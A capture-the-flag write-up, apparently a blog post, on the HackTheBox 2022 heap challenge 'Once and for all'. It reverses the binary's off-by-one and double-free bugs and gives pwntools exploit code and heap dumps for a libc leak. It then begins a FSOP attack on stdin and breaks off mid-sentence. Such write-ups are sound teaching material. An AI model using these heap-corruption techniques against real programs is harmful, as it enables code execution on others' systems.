title = "[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all | repr"
description = "Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.Find the tasks and the final exploit here and here. Reve"
full_description = '''[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all 2022-05-19 pwn 3.3k words HackTheBoxctf Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.Find the tasks and the final exploit here and here. Reverse engineeringAll the snippets of pseudo-code are issued by IDA freeware: 12345678910111213141516171819202122232425262728293031323334int __cdecl main(int argc, const char **argv, const char **envp){ int v4; // [rsp+18h] [rbp-8h] BYREF int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; i <= 49; ++i ) { puts(s); printf(&unk_1310); __isoc99_scanf(&unk_13C8, &v4); puts(s); switch ( v4 ) { case 1: small_alloc(s); break; case 2: fix(s); break; case 3: examine(s); break; case 4: savebig(s); break; case 5: exit(0); default: puts("[-] Invalid choice!"); break; } } return 0;} The binary allows you to allocate a small chunk beetween 0x1f and 0x38 bytes: 123456789101112131415161718192021222324252627282930int small_alloc(){ __int64 v1; // rbx size_t nmemb; // [rsp+0h] [rbp-20h] BYREF __int64 idx[3]; // [rsp+8h] [rbp-18h] BYREF if ( allocated == 15 ) return puts("Nothing more!"); ++allocated; printf("Choose an index: "); __isoc99_scanf("%lu", idx); if ( size_array[2 * idx[0]] || (&alloc_array)[2 * idx[0]] || idx[0] > 0xEuLL ) return puts("[-] Invalid!"); printf("\nHow much space do you need for it: "); __isoc99_scanf("%lu", &nmemb); if ( nmemb <= 0x1F || nmemb > 0x38 ) return puts("[-] Your inventory cannot provide this type of space!"); size_array[2 * idx[0]] = nmemb; v1 = idx[0]; (&alloc_array)[2 * v1] = (void **)calloc(nmemb, 1uLL); if ( !(&alloc_array)[2 * idx[0]] ) { puts("[-] Something didn't work out..."); exit(-1); } puts("Input your weapon's details: "); # off-by-one return read(0, (&alloc_array)[2 * idx[0]], nmemb + 1);} As you can see right above this function contains an off-by-one vulnerability, which means we can write only one byte right after the allocated chunk, overlapping the size field of the next chunk / top chunk. The fix function frees a chunk and asks for another size, then it allocates another chunk with calloc. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546int fix(){ int result; // eax unsigned __int64 v1; // rbx unsigned __int64 idx; // [rsp+8h] [rbp-28h] BYREF size_t size; // [rsp+10h] [rbp-20h] BYREF __int64 v4[3]; // [rsp+18h] [rbp-18h] BYREF printf("Choose an index: "); __isoc99_scanf("%lu", &idx); if ( !size_array[2 * idx] || !alloc_array[2 * idx] || idx > 0xE ) return puts("[-] Invalid!"); puts("Ok, let's get you some new parts for this one... seems like it's broken"); free(alloc_array[2 * idx]); printf("\nHow much space do you need for this repair: "); __isoc99_scanf("%lu", &size); if ( size <= 0x1F || size > 0x38 ) # [1] return puts("[-] Your inventory cannot provide this type of space."); size_array[2 * idx] = size; v1 = idx; alloc_array[2 * v1] = calloc(size, 1uLL); if ( !alloc_array[2 * idx] ) { puts("Something didn't work out..."); exit(-1); } puts("Input your weapon's details: "); read(0, alloc_array[2 * idx], size); printf("What would you like to do now?\n1. Verify weapon\n2. Continue\n>> "); __isoc99_scanf("%lu", v4); result = v4[0]; if ( v4[0] == 1 ) { if ( verified ) { return puts(&unk_1648); } else { result = puts((const char *)alloc_array[2 * idx]); verified = 1; } } return result;} If we reach [1], alloc_array[2 * idx] is freed leading to a double free. We can print a chunk only one time: 1234567891011121314int examine(){ unsigned __int64 v1; // [rsp+8h] [rbp-8h] BYREF if ( examined ) return puts(&unk_14D0); examined = 1; printf("Choose an index: "); __isoc99_scanf("%lu", &v1); if ( size_array[2 * v1] && alloc_array[2 * v1] && v1 <= 0xE ) return puts((const char *)alloc_array[2 * v1]); else return puts("[-] Invalid!");} Finally we can malloc a huge chunk, but we cannot wriet anything within: 123456789101112131415161718192021222324252627int savebig(){ void *v0; // rax size_t size; // [rsp+8h] [rbp-8h] BYREF if ( chungus_weapon || qword_202068 ) { LODWORD(v0) = puts(&unk_16E8); } else { printf("How much space do you need for this massive weapon: "); __isoc99_scanf("%lu", &size); if ( (unsigned __int16)size > 0x5AFu && (unsigned __int16)size <= 0xF5C0u ) { puts("Adding to your inventory.."); chungus_weapon = size; v0 = malloc(size); qword_202068 = (__int64)v0; } else { LODWORD(v0) = puts("[-] This is not possible.."); } } return (int)v0;} ExploitationWhat we have An off-by-one when we create a new chunk Double free by calling fix and then providing an invalid size. Trivial read after free thanks to the double free. Restrictions The program does not use printf with a format specifer, then we cannot do a House of husk. We can only allocate 15 chunks. All the allocations except the big one are made using calloc, even if it can be easily bypassed by adding the IS_MAPPED flag to the chunk header to avoid zero-ing. The libc version (2.27) mitigates a few techniques, especially the House of Orange and introduces the tcache. Allocations have to fit in only two fastbins (0x30 / 0x40), which means we cannot get an arbitrary with a fastbin dup technique due to the size of most of interesting memory areas in the libc (0x7f => 0x70 fastbin against 0x30 / 0x40 in our case). How to leak libc ?Partial overwrites are as far as I know very hard to get because of calloc. The first thing to do is to leak libc addresses to then target libc global variables / structures. The classic way to get a libc leak is to free a chunk that belongs to the unsorted bin and then print it. But as seen previously, we cannot allocate a large chunks that would end up in the unsorted bin. To do so we have to use the off-by-one bug to overwrite the next chunk’s size field with a bigger one that would correspond to the unsorted bin (>= 0x90). We can edit the size of the second chunk from 0x30 to 0xb0 by doing: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677def add(idx, size, data, hang=False): io.sendlineafter(b">> ", b"1") io.sendlineafter(b"Choose an index: ", str(idx).encode()) io.sendlineafter(b"How much space do you need for it: ", str(size).encode()) if hang == True: return io.sendlineafter(b"Input your weapon's details: \n", data)def freexalloc(idx, size, data, doubleFree=False): io.sendlineafter(b">> ", b"2") io.sendlineafter(b"Choose an index: ", str(idx).encode()) io.sendlineafter(b"How much space do you need for this repair: ", str(size).encode()) if doubleFree: return io.sendlineafter(b"Input your weapon's details: \n", data) io.sendlineafter(b">> ", b"1")def show(idx): io.sendlineafter(b">> ", b"3") io.sendlineafter(b"Choose an index: ", str(idx).encode())def allochuge(size): io.sendlineafter(b">> ", b"4") io.sendlineafter(b"How much space do you need for this massive weapon: ", str(size).encode())# get libc leakadd(0, 56, b"A"*55)add(1, 56, b"B"*39)add(2, 40, b"C"*39) # sizeadd(4, 56, b"D"*(0x10))add(5, 40, b"E"*39)add(10, 40, pwn.p64(0) + pwn.p64(0x21)) # barrier# freexalloc(5, 560, b"", doubleFree=True)freexalloc(1, 560, b"", doubleFree=True)freexalloc(0, 560, b"", doubleFree=True)freexalloc(2, 560, b"", doubleFree=True)freexalloc(1, 560, b"", doubleFree=True)add(6, 56, b"\x00"*56 + b"\xb1") # fake unsorted chunk"""0x555555608560: 0x0000000000000000 0x0000000000000041 [0]0x555555608570: 0x00005555556085a0 0x41414141414141410x555555608580: 0x4141414141414141 0x41414141414141410x555555608590: 0x4141414141414141 0x41414141414141410x5555556085a0: 0x0a41414141414141 0x0000000000000041 [1]0x5555556085b0: 0x0000000000000000 0x00000000000000000x5555556085c0: 0x0000000000000000 0x00000000000000000x5555556085d0: 0x0000000000000000 0x00000000000000000x5555556085e0: 0x0000000000000000 0x00000000000000b1 [2] <- Fake size | PREV_INUSE (1)0x5555556085f0: 0x0000000000000000 0x4343434343434343 0x555555608600: 0x4343434343434343 0x4343434343434343 0x555555608610: 0x0a43434343434343 0x0000000000000041 [3] 0x555555608620: 0x4444444444444444 0x4444444444444444 0x555555608630: 0x000000000000000a 0x00000000000000000x555555608640: 0x0000000000000000 0x0000000000000000 0x555555608650: 0x0000000000000000 0x0000000000000031 [4] 0x555555608660: 0x4545454545454545 0x4545454545454545 0x555555608670: 0x4545454545454545 0x4545454545454545 0x555555608680: 0x0a45454545454545 0x0000000000000031 [10] 0x555555608690: 0x0000000000000000 0x0000000000000021 <- Fake chunk header 0x5555556086a0: 0x000000000000000a 0x00000000000000000x5555556086b0: 0x0000000000000000 0x0000000000020951 <- Top chunkfastbins0x30: 0x5555556085e0 ◂— 0x00x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0""" We allocate 6 chunks, we do need of 6 chunks because of the fake size we write on chunk_2 (&chunk_2 + 0xb0 = 0x555555608690, in the last chunk near the top chunk). In the same way we craft a fake header in the body of the last chunk to avoid issues during the release of chunk_2. If you’re not familiar with the security checks done by malloc and free, I would advise you to take a look at this resource. Now that chunk_2 has been tampered with a fake 0xb0 size, we just have to free it 8 times (to fill the tcache) to put it in the unsorted bin: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647freexalloc(2, 560, b"", doubleFree=True)freexalloc(2, 560, b"", doubleFree=True)freexalloc(2, 560, b"", doubleFree=True)freexalloc(2, 560, b"", doubleFree=True)freexalloc(2, 560, b"", doubleFree=True)freexalloc(2, 560, b"", doubleFree=True)freexalloc(2, 560, b"", doubleFree=True)freexalloc(2, 560, b"", doubleFree=True)# falls into the unsortedbinshow(2)libc = pwn.u64(io.recvline()[:-1].ljust(8, b"\x00")) - 0x3ebca0 # offset of the unsorted binstdin = libc + 0x3eba00pwn.log.info(f"libc: {hex(libc)}")"""0x555555608560: 0x0000000000000000 0x00000000000000410x555555608570: 0x00005555556085a0 0x41414141414141410x555555608580: 0x4141414141414141 0x41414141414141410x555555608590: 0x4141414141414141 0x41414141414141410x5555556085a0: 0x0a41414141414141 0x00000000000000410x5555556085b0: 0x0000000000000000 0x00000000000000000x5555556085c0: 0x0000000000000000 0x00000000000000000x5555556085d0: 0x0000000000000000 0x00000000000000000x5555556085e0: 0x0000000000000000 0x00000000000000b10x5555556085f0: 0x00007ffff7dcfca0 0x00007ffff7dcfca00x555555608600: 0x4343434343434343 0x43434343434343430x555555608610: 0x0a43434343434343 0x00000000000000410x555555608620: 0x4444444444444444 0x44444444444444440x555555608630: 0x000000000000000a 0x00000000000000000x555555608640: 0x0000000000000000 0x00000000000000000x555555608650: 0x0000000000000000 0x00000000000000310x555555608660: 0x4545454545454545 0x45454545454545450x555555608670: 0x4545454545454545 0x45454545454545450x555555608680: 0x0a45454545454545 0x00000000000000310x555555608690: 0x00000000000000b0 0x00000000000000200x5555556086a0: 0x000000000000000a 0x00000000000000000x5555556086b0: 0x0000000000000000 0x0000000000020951unsortedbinall: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0tcachebins0xb0 [ 7]: 0x5555556085f0 —▸ 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556086b0 ◂— 0x0""" Which gives: 123456789101112nasm@off:~/Documents/pwn/HTB/apocalypse/onceAndmore$ python3 exploit.py LOCAL GDB NOASLR[*] '/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/out'[!] Debugging process with ASLR disabled[+] Starting local process '/usr/bin/gdbserver': pid 31378[*] running in new terminal: ['/usr/bin/gdb', '-q', '/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all', '-x', '/tmp/pwn1z_5e0ie.gdb'][*] libc: 0x7ffff79e4000 We now have achieved the first step of the challenge: leak the libc base address. What can we target in the libc ?There are a lot of ways to achieve code execution according to what I red in other write-ups, I choose to attack _IO_stdin by running an unsorted bin attack on its _IO_buf_end field which holds the end of the internal buffer of stdin from _IO_buf_base, according to the glibc source code: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485int_IO_new_file_underflow (_IO_FILE *fp){ _IO_ssize_t count;#if 0 /* SysV does not make this test; take it out for compatibility */ if (fp->_flags & _IO_EOF_SEEN) return (EOF);#endif if (fp->_flags & _IO_NO_READS) { fp->_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; } if (fp->_IO_read_ptr < fp->_IO_read_end) return *(unsigned char *) fp->_IO_read_ptr; if (fp->_IO_buf_base == NULL) { /* Maybe we already have a push back pointer. */ if (fp->_IO_save_base != NULL) { free (fp->_IO_save_base); fp->_flags &= ~_IO_IN_BACKUP; } _IO_doallocbuf (fp); } /* Flush all line buffered files before reading. */ /* FIXME This can/should be moved to genops ?? */ if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED)) {#if 0 _IO_flush_all_linebuffered ();#else /* We used to flush all line-buffered stream. This really isn't required by any standard. My recollection is that traditional Unix systems did this for stdout. stderr better not be line buffered. So we do just that here explicitly. --drepper */ _IO_acquire_lock (_IO_stdout); if ((_IO_stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF)) == (_IO_LINKED | _IO_LINE_BUF)) _IO_OVERFLOW (_IO_stdout, EOF); _IO_release_lock (_IO_stdout);#endif } _IO_switch_to_get_mode (fp); /* This is very tricky. We have to adjust those pointers before we call _IO_SYSREAD () since we may longjump () out while waiting for input. Those pointers may be screwed up. H.J. */ fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base; fp->_IO_read_end = fp->_IO_buf_base; fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end = fp->_IO_buf_base; count = _IO_SYSREAD (fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base); if (count <= 0) { if (count == 0) fp->_flags |= _IO_EOF_SEEN; else fp->_flags |= _IO_ERR_SEEN, count = 0; } fp->_IO_read_end += count; if (count == 0) { /* If a stream is read to EOF, the calling application may switch active handles. As a result, our offset cache would no longer be valid, so unset it. */ fp->_offset = _IO_pos_BAD; return EOF; } if (fp->_offset != _IO_pos_BAD) _IO_pos_adjust (fp->_offset, count); return *(unsigned char *) fp->_IO_read_ptr;} The interesting part is the count = _IO_SYSREAD (fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base); which reads fp->_IO_buf_end - fp->_IO_buf_base bytes in fp->_IO_buf_base. Which means if fp->_IO_buf_end is replaced with the help of an unsorted bin attack by the address of the unsorted bin and that &unsorted bin > fp->_IO_buf_base, we can trigger an out of bound write from a certain address up to the address of the unsorted bin. We can inspect the layout in g'''
